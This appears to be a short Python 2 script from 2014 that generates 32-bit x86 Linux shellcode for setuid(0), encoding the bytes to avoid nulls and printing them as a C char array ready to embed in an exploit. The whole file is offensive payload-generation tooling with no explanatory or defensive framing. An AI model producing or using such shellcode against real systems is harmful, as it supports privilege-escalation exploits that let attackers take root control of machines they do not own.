from struct import pack
import sys 
import binascii

##########################################################
#
#  1.  setuid shellcode
#  
#
#	                         random	     2014-04-21
##########################################################


##########################################################
des_format = 'shellcode: setuid(%s)' 
ALIGN = 4
UID = 0
##########################################################

def out_format(language):
	if language=='c':
		des = '\n\n/*\n*  '+ des_format +'\n*/'
	elif language=='python':
		des = '\n\n#  '+ des_format +'  #'
	elif language=='perl':
		des = '\n\n#  '+ des_format +'  #'
	else:
		return 
	print des % (str(UID))




def getshellcode(language, shellcode):
	new_shellcode = ''
	if language == 'bin':
			new_shellcode = shellcode
			sys.stdout.write(new_shellcode)
	if language == 'c':
			sys.stdout.write("\nchar shellcode[] = \\\n\"")
			for i in xrange(len(shellcode)):
				tmp =  '\\'+ str(hex(ord(shellcode[i])))[1:]  
				new_shellcode += tmp
				sys.stdout.write(tmp)
				if   not (i+1) % 16 :
					sys.stdout.write("\"\n\"")
			sys.stdout.write("\";\n\n\n")
	if language == 'perl':
			pass
	if language == 'python':
			pass	

def setuid_shellcode(userid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (userid <= 0):
		pass
	elif (userid <= 0xff):
		shellcode += '\xb3' + pack('B',userid)							#mov bl,UID
	elif (userid > 0xff):
		if not (userid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',userid+1)			#mov bx,(UID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',userid)				#mov bx,(UID)
	shellcode += '\xb0\x17'													#mov ax,0x17
	shellcode += '\xcd\x80'													#int 0x80  -----> setuid(UID)
	return shellcode


if __name__ == '__main__':

	language = 'c'
	shellcode = setuid_shellcode(UID)
	out_format(language)
	getshellcode(language, shellcode)
	



